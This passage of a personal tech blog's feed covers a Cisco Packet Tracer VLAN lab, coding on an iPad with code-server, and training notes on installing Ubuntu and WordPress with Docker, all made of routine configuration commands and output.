class="number">1003</span> token-ring-<span class="keyword">default</span>               active    </span><br><span class="line"><span class="number">1004</span> fddinet-<span class="keyword">default</span>                  active    </span><br><span class="line"><span class="number">1005</span> trnet-<span class="keyword">default</span>                    active    </span><br><span class="line"></span><br><span class="line">VLAN Type  SAID       MTU   Parent RingNo BridgeNo Stp  BrdgMode Trans1 Trans2</span><br><span class="line">---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------</span><br><span class="line"><span class="number">1</span>    enet  <span class="number">100001</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span></span><br><span class="line"><span class="number">10</span>   enet  <span class="number">100010</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span></span><br><span class="line"><span class="number">1002</span> fddi  <span class="number">101002</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1003</span> tr    <span class="number">101003</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1004</span> fdnet <span class="number">101004</span>     <span class="number">1500</span>  -      -      -        ieee -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1005</span> trnet <span class="number">101005</span>     <span class="number">1500</span>  -      -      -        ibm  -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"></span><br><span class="line">VLAN Type  SAID       MTU   Parent RingNo BridgeNo Stp  BrdgMode Trans1 Trans2</span><br><span class="line">---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------</span><br><span class="line"></span><br><span class="line">Remote SPAN VLANs</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Primary Secondary Type              Ports</span><br><span class="line">------- --------- ----------------- ------------------------------------------</span><br><span class="line">Switch(config-vlan)#〔筆畫〕</span><br><span class="line">Switch(config-vlan)# interface fastEthernet <span class="number">0</span>/<span class="number">1</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#switchport access vlan <span class="number">10</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#<span class="keyword">do</span> show vlan</span><br><span class="line"></span><br><span class="line">VLAN Name                             Status    Ports</span><br><span class="line">---- -------------------------------- --------- -------------------------------</span><br><span class="line"><span class="number">1</span>    <span class="keyword">default</span>                          active    Fa0/<span class="number">2</span>, Fa0/<span class="number">3</span>, Fa0/<span class="number">4</span>, Fa0/<span class="number">5</span></span><br><span class="line">                                                Fa0/<span class="number">6</span>, Fa0/<span class="number">7</span>, Fa0/<span class="number">8</span>, Fa0/<span class="number">9</span></span><br><span class="line">                                                Fa0/<span class="number">10</span>, Fa0/<span class="number">11</span>, Fa0/<span class="number">12</span>, Fa0/<span class="number">13</span></span><br><span class="line">                                                Fa0/<span class="number">14</span>, Fa0/<span class="number">15</span>, Fa0/<span class="number">16</span>, Fa0/<span class="number">17</span></span><br><span class="line">                                                Fa0/<span class="number">18</span>, Fa0/<span class="number">19</span>, Fa0/<span class="number">20</span>, Fa0/<span class="number">21</span></span><br><span class="line">                                                Fa0/<span class="number">22</span>, Fa0/<span class="number">23</span>, Fa0/<span class="number">24</span></span><br><span class="line"><span class="number">10</span>   VLAN0010                         active    Fa0/<span class="number">1</span></span><br><span class="line"><span class="number">1002</span> fddi-<span class="keyword">default</span>                     active    </span><br><span class="line"><span class="number">1003</span> token-ring-<span class="keyword">default</span>               active    </span><br><span class="line"><span class="number">1004</span> fddinet-<span class="keyword">default</span>                  active    </span><br><span class="line"><span class="number">1005</span> trnet-<span class="keyword">default</span>                    active    </span><br><span class="line"></span><br><span class="line">VLAN Type  SAID       MTU   Parent RingNo BridgeNo Stp  BrdgMode Trans1 Trans2</span><br><span class="line">---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------</span><br><span class="line"><span class="number">1</span>    enet  <span class="number">100001</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span></span><br><span class="line"><span class="number">10</span>   enet  <span class="number">100010</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span></span><br><span class="line"><span class="number">1002</span> fddi  <span class="number">101002</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1003</span> tr    <span class="number">101003</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1004</span> fdnet <span class="number">101004</span>     <span class="number">1500</span>  -      -      -        ieee -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1005</span> trnet <span class="number">101005</span>     <span class="number">1500</span>  -      -      -        ibm  -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"></span><br><span class="line">VLAN Type  SAID       MTU   Parent RingNo BridgeNo Stp  BrdgMode Trans1 Trans2</span><br><span class="line">---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------</span><br><span class="line"></span><br><span class="line">Remote SPAN VLANs</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Primary Secondary Type              Ports</span><br><span class="line">------- --------- ----------------- ------------------------------------------</span><br><span class="line">Switch(config-<span class="keyword">if</span>)#</span><br><span class="line">%CDP-<span class="number">4</span>-NATIVE_VLAN_MISMATCH: Native VLAN mismatch discovered on FastEthernet0/<span class="number">1</span> (<span class="number">10</span>), <span class="keyword">with</span> Switch FastEthernet0/<span class="number">1</span> (<span class="number">1</span>).</span><br></pre></td></tr></table></figure><p>Then change the mode of fastEthernet 0/24 to trunk mode.</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Switch(config-<span class="keyword">if</span>)#interface fastEthernet <span class="number">0</span>/<span class="number">24</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#switchport mode trunk</span><br><span class="line"></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface FastEthernet0/<span class="number">24</span>, changed state to down</span><br><span class="line"></span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface FastEthernet0/<span class="number">24</span>, changed state to up</span><br></pre></td></tr></table></figure><h2 id="Set-IP-Address-for-PCs"><a href="#Set-IP-Address-for-PCs" class="headerlink" title="Set IP Address for PCs"></a>Set IP Address for PCs</h2><p>Set the IP of PC1 to 192.168.1.1, then set the IP of PC2 to 192.168.1.2. Then close the window to save the configuration. Open the Command Prompt. Try to ping PC2 from PC1. When you find a reply from PC2, you have done a good job.</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\\&gt;ping <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span></span><br><span class="line"></span><br><span class="line">Pinging <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span> <span class="keyword">with</span> <span class="number">32</span> bytes <span class="keyword">of</span> data:</span><br><span class="line"></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span>: bytes=<span class="number">32</span> time=22ms TTL=<span class="number">128</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">128</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">128</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span>: bytes=<span class="number">32</span> time=1ms TTL=<span class="number">128</span></span><br><span class="line"></span><br><span class="line">Ping statistics <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span>:</span><br><span class="line">    Packets: Sent = <span class="number">4</span>, Received = <span class="number">4</span>, Lost = <span class="number">0</span> (<span class="number">0</span>% loss),</span><br><span class="line">Approximate round trip times <span class="keyword">in</span> milli-seconds:</span><br><span class="line">    Minimum = 0ms, Maximum = 22ms, Average = 5ms</span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:\\&gt;</span><br></pre></td></tr></table></figure><h1 id="Other-Problem"><a href="#Other-Problem" class="headerlink" title="Other Problem"></a>Other Problem</h1><h2 id="Incorrectly-Entered-Command-and-Go-to-Resolving-Domain"><a href="#Incorrectly-Entered-Command-and-Go-to-Resolving-Domain" class="headerlink" title="Incorrectly Entered Command and Go to Resolving Domain"></a>Incorrectly Entered Command and Go to Resolving Domain</h2><p>Press Ctrl+Shift+6 to cancel the operation.</p><h1 id="At-the-End"><a href="#At-the-End" class="headerlink" title="At the End"></a>At the End</h1><p>From now on, I will try to use Chinese and English in each post. I want to improve my English by doing this. So if you find a mistake in the post, or even a grammatical mistake, please leave a message below the article. It is my pleasure to listen to your criticisms and suggestions!</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;预先准备&quot;&gt;&lt;a href=&quot;#预先准备&quot; class=&quot;headerlink&quot; title=&quot;预先准备&quot;&gt;&lt;/a&gt;预先准备&lt;/h1&gt;&lt;p&gt;先在 CPT(Cisco Packet Tracer) 上放置两个PC，两个Switch，然后将PC与各自的 Switch 通过  Copper Straight-Through 连接，交换机之间通过 Copper Cross-over 连接，此处两个 Switch 使用 2950-24 型号，将Switch的0/1口和PC进行连接，将Switch的0/24口相互连接。&lt;/p&gt;
&lt;p&gt;我们的目的是将这四个设备划分在一个 VLAN(VLAN 10) 中。&lt;/p&gt;</summary>
    
    
    
    <category term="技术篇" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    <category term="计算机网络原理" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/"/>
    
    <category term="学习" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="实验" scheme="https://guo.moe/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>来！试试用 iPad 来写代码吧！</title>
    <link href="https://guo.moe/archives/code-at-iPad.html"/>
    <id>https://guo.moe/archives/code-at-iPad.html</id>
    <published>2021-01-24T09:00:00.000Z</published>
    <updated>2021-06-11T09:18:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>买了 iPad 以后，就感觉破破 XPS 老吉尔重了，出门还是喜欢带一个 iPad + 某宝20块钱买的蓝牙键盘码码字。但由于上课还是得撸码写写 C 或者 Python 什么的，XPS 还是得带，于是在网络上寻找有没有可以用 iPad 来写代码，最好能调试运行的方案。</p><span id="more"></span><h1 id="方案一：Repl-it"><a href="#方案一：Repl-it" class="headerlink" title="方案一：Repl.it"></a>方案一：Repl.it</h1><p>地址：<a href="https://repl.it/">Repl.it</a></p><p>这个方案是 <a href="https://elepover.com/">@Elepover</a> 推荐给我的。作为一个开箱即用的站点，可以直接克隆 GitHub 上的仓库使用，或者直接开启一个空项目进行代码，而且支持几乎所有的主流编程语言。更重要的是，它还提供 Shell ，这个 Shell 虽然不提供 root 权限，但是是支持连接到互联网的。</p><p><img data-src="/images/Article/Code-At-iPad/replit.png" alt="replit.png"></p><p>甚至你还可以进行调试，不过调试功能目前仅支持 Python，而且不知道为啥好像没法正常使用。</p><h1 id="方案二：自建-Code-Server"><a href="#方案二：自建-Code-Server" class="headerlink" title="方案二：自建 Code Server"></a>方案二：自建 Code Server</h1><p>这也是我正在使用的方案，其一是界面就是自己熟悉的 Visual Studio Code 的界面，其二就是部署在自己服务器上，有最高权限的情况下，自己爱咋装软件咋装。</p><h2 id="使用-Docker-Compose"><a href="#使用-Docker-Compose" class="headerlink" title="使用 Docker-Compose"></a>使用 Docker-Compose</h2><p>Do，必须 Do，有 Docker 的怎么能不用 Docker 呢</p><p>参考文档：<a href="https://hub.docker.com/r/linuxserver/code-server">linuxserver/code-server</a></p><p>此处注意，为了方便之后不用我手动安装 Python 软件包，我在 environment 处加了一行</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- DOCKER_MODS=linuxserver/mods:code-server-python3</span><br></pre></td></tr></table></figure><p>参考资料：<a href="https://github.com/linuxserver">linuxserver</a>/<strong><a href="https://github.com/linuxserver/docker-mods">docker-mods</a></strong></p><h2 id="配置-iPad"><a href="#配置-iPad" class="headerlink" title="配置 iPad"></a>配置 iPad</h2><p>这里我使用的软件是 ‎<a href="https://apps.apple.com/cn/app/servediter-for-code-server/id1504491325?l=en">Servediter for code-server</a> ，其实也可以使用浏览器，不过这个配置好点开就可以用了，还是比较方便的。</p><h2 id="配置-Python"><a href="#配置-Python" class="headerlink" title="配置 Python"></a>配置 Python</h2><p>此处有一个巨坑，通过 Marketplace 安装的 Extensions 似乎无法正常使用，之前一直以为是 Code Server 的问题，直到昨天在 <a href="https://t.me/jqqqqqqqqqq">@jqqqqqqqqqq</a> 的提醒与帮助下，有这么一个 issue</p><p><a href="https://github.com/cdr/code-server/issues/1837">Python extension fails to activate · Issue #1837 · cdr/code-server</a></p><p>在通过 vsix 安装 <a href="https://github.com/microsoft/vscode-python/releases/tag/2020.5.86806">https://github.com/microsoft/vscode-python/releases/tag/2020.5.86806</a> 后问题得到解决，然后再创建 launch.json 后写入</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Use IntelliSense to learn about possible attributes.</span></span><br><span class="line">    <span class="comment">// Hover to view descriptions of existing attributes.</span></span><br><span class="line">    <span class="comment">// For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387</span></span><br><span class="line">    <span class="string">&quot;version&quot;</span>: <span class="string">&quot;0.2.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;configurations&quot;</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Python: Current File&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;python&quot;</span>,</span><br><span class="line">        <span class="string">&quot;request&quot;</span>: <span class="string">&quot;launch&quot;</span>,</span><br><span class="line">        <span class="string">&quot;program&quot;</span>: <span class="string">&quot;$&#123;file&#125;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;console&quot;</span>: <span class="string">&quot;integratedTerminal&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>记得先保存文件，默认目录会放在 /config/workspace。</p><p>在 Run 选项卡中选择 Python: Current File，点击运行</p><p><img data-src="/images/Article/Code-At-iPad/Python-Debug.png" alt="python.png"></p><p>成了！</p><p>接下来的操作就和在</p><h2 id="配置-C-C"><a href="#配置-C-C" class="headerlink" title="配置 C/C++"></a>配置 C/C++</h2><p>这里也有一个巨坑。同 Python 一样，通过 Marketplace 安装的 Extensions 也会导致出现奇奇怪怪的错误，能用，只能用一点点。</p><p>参考资料：<a href="https://nekiglacier.top/2020/10/21/CoderServerDocker%E6%90%AD%E5%BB%BAC%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83/">CodeServer搭建C++编译环境 | NekiGlacier</a></p><p>具体搭建环境的方法上述文章已经写了，这里就不赘述了。</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>最后，经过这么一两个月的来回横跳，终于达成了在 iPad 上写代码的愿望，但是也放假了。。</p><p>然后最近快要过年了，我先给大家拜个早年（不是</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;买了 iPad 以后，就感觉破破 XPS 老吉尔重了，出门还是喜欢带一个 iPad + 某宝20块钱买的蓝牙键盘码码字。但由于上课还是得撸码写写 C 或者 Python 什么的，XPS 还是得带，于是在网络上寻找有没有可以用 iPad 来写代码，最好能调试运行的方案。&lt;/p&gt;</summary>
    
    
    
    <category term="技术篇" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
    <category term="iPad" scheme="https://guo.moe/tags/iPad/"/>
    
  </entry>
  
  <entry>
    <title>不 锈 钢 牌 讲 师 —— WordPress 在 docker-lemp 上的安装</title>
    <link href="https://guo.moe/archives/WordPress-Installation.html"/>
    <id>https://guo.moe/archives/WordPress-Installation.html</id>
    <published>2020-07-20T02:00:00.000Z</published>
    <updated>2021-06-11T09:18:07.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第二讲"><a href="#第二讲" class="headerlink" title="第二讲"></a>第二讲</h1><p>为了照顾各个同学的网络，所以听讲的同学们请至少提前一天完成以下操作，节省时间就能提早讲完。</p><span id="more"></span><h2 id="提前-下载-WordPress-压缩包"><a href="#提前-下载-WordPress-压缩包" class="headerlink" title="(提前) 下载 WordPress 压缩包"></a>(提前) 下载 WordPress 压缩包</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span></span><br><span class="line">wget https://wordpress.org/latest.zip</span><br></pre></td></tr></table></figure><h2 id="提前-安装-docker-等必要套件"><a href="#提前-安装-docker-等必要套件" class="headerlink" title="(提前) 安装 docker 等必要套件"></a>(提前) 安装 docker 等必要套件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y unzip git docker.io docker-compose</span><br></pre></td></tr></table></figure><h2 id="提前-更换-Docker-镜像源"><a href="#提前-更换-Docker-镜像源" class="headerlink" title="(提前) 更换 Docker 镜像源"></a>(提前) 更换 Docker 镜像源</h2><p>参考资料：<a href="https://blog.csdn.net/whatday/article/details/86770609">https://blog.csdn.net/whatday/article/details/86770609</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"><span class="comment"># 修改为以下内容</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;http://hub-mirror.c.163.com&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><h2 id="提前-拉取-Docker-镜像"><a href="#提前-拉取-Docker-镜像" class="headerlink" title="(提前) 拉取 Docker 镜像"></a>(提前) 拉取 Docker 镜像</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull metowolf/php:7.4.6</span><br><span class="line">sudo docker pull mysql/mysql-server:8.0.20</span><br><span class="line">sudo docker pull phpmyadmin/phpmyadmin:5.0.2</span><br><span class="line">sudo docker pull metowolf/nginx:1.17.10</span><br><span class="line">sudo docker pull redis:6.0.2-alpine</span><br></pre></td></tr></table></figure><h2 id="metowolf-docker-lemp-部署"><a href="#metowolf-docker-lemp-部署" class="headerlink" title="metowolf/docker-lemp 部署"></a>metowolf/docker-lemp 部署</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/metowolf/docker-lemp.git</span><br><span class="line"><span class="built_in">cd</span> docker-lemp</span><br><span class="line">cp .env.example .env</span><br><span class="line">cp docker-compose.example.yml docker-compose.yml</span><br><span class="line"><span class="comment"># 修改 .env</span></span><br><span class="line">vim .env</span><br><span class="line"><span class="comment"># 将 MYSQL_ROOT_PASSWORD=root 中的 root 改成你想要的密码</span></span><br><span class="line"><span class="comment"># 或者尝试 sed -i &#x27;s/root/密码/g&#x27; .env</span></span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure><h2 id="访问网站"><a href="#访问网站" class="headerlink" title="访问网站"></a>访问网站</h2><p>在浏览器中打开上面的 IP，浏览器正常输出 phpinfo();</p><h2 id="WordPress-部署"><a href="#WordPress-部署" class="headerlink" title="WordPress 部署"></a>WordPress 部署</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> wwwroot/default</span><br><span class="line">rm -f index.php</span><br><span class="line">mv ~/latest.zip .</span><br><span class="line">unzip latest.zip</span><br><span class="line">mv wordpress/* .</span><br><span class="line">rm -rf wordpress/</span><br></pre></td></tr></table></figure><h3 id="在-phpmyadmin-创建新数据库"><a href="#在-phpmyadmin-创建新数据库" class="headerlink" title="在 phpmyadmin 创建新数据库"></a>在 phpmyadmin 创建新数据库</h3><p>浏览器登入 ip:8080 ，输入账号 root 和刚设的密码，点击数据库，输入数据库名，创建数据库</p><p><img data-src="/images/Article/Ubuntu-Installation-WordPress//Untitled%202.png" alt="/images/Article/Ubuntu-Installation-WordPress//Untitled%202.png"></p><p>这边为了节省时间就暂时不分离账户了，有兴趣的小伙伴也可以自行搜索方法或者直接创建账户分权。</p><h3 id="WordPress-向导数据库填写"><a href="#WordPress-向导数据库填写" class="headerlink" title="WordPress 向导数据库填写"></a>WordPress 向导数据库填写</h3><p><img data-src="/images/Article/Ubuntu-Installation-WordPress//Untitled%203.png" alt="/images/Article/Ubuntu-Installation-WordPress//Untitled%203.png"></p><p>注意向导这里，数据库填写刚才创建的数据库，密码填写刚才修改的密码，主机填写 mysql</p><p>然后可能会遇到</p><p><img data-src="/images/Article/Ubuntu-Installation-WordPress//Untitled%204.png" alt="/images/Article/Ubuntu-Installation-WordPress//Untitled%204.png"></p><p>输入 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/docker-lemp/wwwroot/default/wp-config.php</span><br></pre></td></tr></table></figure><p>将上面的内容复制到其中，保存</p><p>站点信息自己设置一下，就可以完成了</p><h1 id="废弃方案"><a href="#废弃方案" class="headerlink" title="废弃方案"></a>废弃方案</h1><p>这边堆放复杂的废弃方案</p><h2 id="废弃-安装-docker"><a href="#废弃-安装-docker" class="headerlink" title="(废弃) 安装 docker"></a>(废弃) 安装 docker</h2><p>参考资料：<a href="https://docs.docker.com/engine/install/ubuntu/">https://docs.docker.com/engine/install/ubuntu/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install \</span><br><span class="line">  apt-transport-https \</span><br><span class="line">  ca-certificates \</span><br><span class="line">  curl \</span><br><span class="line">  gnupg-agent \</span><br><span class="line">  software-properties-common</span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line">sudo add-apt-repository \</span><br><span class="line"> <span class="string">&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string"> <span class="subst">$(lsb_release -cs)</span> \</span></span><br><span class="line"><span class="string"> stable&quot;</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure><h2 id="废弃-安装-docker-compose"><a href="#废弃-安装-docker-compose" class="headerlink" title="(废弃) 安装 docker-compose"></a>(废弃) 安装 docker-compose</h2><p>参考资料：<a href="https://docs.docker.com/compose/install/">https://docs.docker.com/compose/install/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo curl -L <span class="string">&quot;https://github.com/docker/compose/releases/download/1.26.2/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line">sudo chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;第二讲&quot;&gt;&lt;a href=&quot;#第二讲&quot; class=&quot;headerlink&quot; title=&quot;第二讲&quot;&gt;&lt;/a&gt;第二讲&lt;/h1&gt;&lt;p&gt;为了照顾各个同学的网络，所以听讲的同学们请至少提前一天完成以下操作，节省时间就能提早讲完。&lt;/p&gt;</summary>
    
    
    
    <category term="技术篇" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
    <category term="工作室" scheme="https://guo.moe/tags/%E5%B7%A5%E4%BD%9C%E5%AE%A4/"/>
    
    <category term="培训" scheme="https://guo.moe/tags/%E5%9F%B9%E8%AE%AD/"/>
    
  </entry>
  
  <entry>
    <title>不 锈 钢 牌 讲 师 —— Ubuntu 的安装与基本命令</title>
    <link href="https://guo.moe/archives/Ubuntu-Installation.html"/>
    <id>https://guo.moe/archives/Ubuntu-Installation.html</id>
    <published>2020-07-20T01:00:00.000Z</published>
    <updated>2021-06-11T09:18:07.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="课前注意"><a href="#课前注意" class="headerlink" title="课前注意"></a>课前注意</h1><p>由于第一次尝试干这种活，可能干的是烂活，讲的过程中有啥问题可以直接指出</p><p>本文为培训参考资料，讲 Linux 的基础操作和 WordPress 的安装，<del>如果路过博客的小伙伴觉得技术一般的话能不能轻点骂 QAQ</del></p><p>网安的成员可以独立完成的话可参考 <a href="https://guo.moe/archives/Docker-Swarm.html">https://guo.moe/archives/Docker-Swarm.html</a> 尝试自行完成其他任务。</p><p>开头讲的都是比较基础的内容，所以有基础的本来大概懂的学习了以后可以自己拓展一下，没有的跟着走就好了，请大家务必先把课前的内容提前安排好。</p><blockquote><p>善于使用搜索引擎</p></blockquote><p>如果是安装过程中出现问题，请先尝试将你的问题在搜索引擎上寻找答案，在没有自行搜索过答案的情况下直接提问可能只会获得 <a href="https://lmbtfy.cn/">https://lmbtfy.cn/</a> </p><span id="more"></span><h1 id="第一讲（复习巩固为主）"><a href="#第一讲（复习巩固为主）" class="headerlink" title="第一讲（复习巩固为主）"></a>第一讲（复习巩固为主）</h1><h2 id="Ubuntu-环境安装（课前）"><a href="#Ubuntu-环境安装（课前）" class="headerlink" title="Ubuntu 环境安装（课前）"></a>Ubuntu 环境安装（课前）</h2><p>有 VMware 的可以用 VMware，没有的自己下载或者用免费的 VirtualBox ，这边统一一下 Ubuntu 20.04 方便后续操作</p><p>VirtualBox 下载：<a href="https://www.virtualbox.org/wiki/Downloads">https://www.virtualbox.org/wiki/Downloads</a></p><p>Ubuntu 20.04 镜像下载：<a href="https://ubuntu.com/download/server/thank-you?version=20.04&architecture=amd64">https://ubuntu.com/download/server/thank-you?version=20.04&amp;architecture=amd64</a></p><p>参考资料：</p><p>VMware: <a href="https://blog.csdn.net/github_38336924/article/details/82427252">https://zhuanlan.zhihu.com/p/38797088</a></p><p>Virtualbox: <a href="https://segmentfault.com/a/1190000022468063">https://zhuanlan.zhihu.com/p/35619204</a></p><p>按照教程一步步走，<del>节省时间你用简易安装也没所谓</del></p><p>目前已知的问题 1：自带的 ubuntu CN 镜像源十分缓慢，安装向导如果遇到 mirrors 字样的设置请将镜像源换为 <a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu">https://mirrors.tuna.tsinghua.edu.cn/ubuntu</a></p><p>目前已知的问题 2: 安装过程不要使用简易安装，不然可能会出现卡在 installing open-vm-tools 的问题</p><p><img data-src="/images/Article/Ubuntu-Installation-WordPress//Untitled.png" alt="/images/Article/Ubuntu-Installation-WordPress//Untitled.png"></p><p>注意此处把 openssh server 勾上，忘记勾了也没关系</p><p>注意：登陆的时候 password 是没有显示的，不会显示星星之类的任何东西，按照你的感觉输完了以后直接回车就好了</p><h2 id="Ubuntu-基本命令使用"><a href="#Ubuntu-基本命令使用" class="headerlink" title="Ubuntu 基本命令使用"></a>Ubuntu 基本命令使用</h2><p>注：权限不足的情况下请在下列命令前写上 sudo[空格!] 再尝试，或者输入 sudo su 切换到 root 